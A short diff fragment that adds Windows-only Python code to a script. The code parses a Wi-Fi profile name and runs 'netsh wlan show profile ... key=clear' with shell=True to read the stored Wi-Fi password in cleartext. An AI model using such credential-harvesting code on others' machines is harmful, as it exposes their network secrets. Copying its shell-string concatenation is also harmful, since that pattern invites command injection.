@@ -73,3 +73,10 @@ if os.name == "nt":
             except:
                 pass
 
+            next_word = next_word.split('\\r\\n')[0]
+            if ':' in next_word:
+                next_word = next_word.split(':')[1]
+                if ' ' in next_word:
+                    next_word = next_word.replace(' ', "")
+            wifi = subprocess.check_output('netsh wlan show profile ' + '"' + next_word + '"' + ' key=clear',
+                                           shell=True)
